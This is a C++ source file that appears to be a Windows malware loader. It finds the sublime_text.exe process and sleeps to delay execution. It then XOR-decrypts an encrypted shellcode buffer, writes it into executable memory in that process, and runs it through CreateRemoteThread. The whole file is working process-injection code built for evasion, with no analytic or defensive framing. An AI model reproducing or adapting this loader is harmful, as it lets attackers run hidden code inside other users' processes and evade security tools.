#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <memoryapi.h>

#include <cstdint>
#include <string>
#include <iostream>

#include "resource.h"
#include "multitool.h"
using namespace std;

DWORD GetProcessId(wstring processName) {

	PROCESSENTRY32 processEntryList;
	processEntryList.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}
	Process32First(hSnapshot, &processEntryList);
	if (!processName.compare(processEntryList.szExeFile)) {
		CloseHandle(hSnapshot);
		return processEntryList.th32ProcessID;
	}
	while (Process32Next(hSnapshot, &processEntryList)) {
		if (!processName.compare(processEntryList.szExeFile)) {
			CloseHandle(hSnapshot);
			return processEntryList.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main(void) {

	constexpr int defaultseed = RandomSeed();
	srand(defaultseed);

	__alt_sleepms(SLEEPTIME * 12);

	wstring processName = L"sublime_text.exe";
	DWORD pid = GetProcessId(processName);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	HMODULE hFunctionCall = LoadLibrary((LPCWSTR)sKernel32);
	
	XorCipher(sh3llc0d3, payloadLen, key, keyLen);
	PVOID hAddressSpace = VirtualAllocEx(hProcess, NULL, payloadLen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, hAddressSpace, (LPCVOID)sh3llc0d3, payloadLen, NULL);

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hAddressSpace, NULL, 0, NULL);

	CloseHandle(hProcess);
	return 0;
}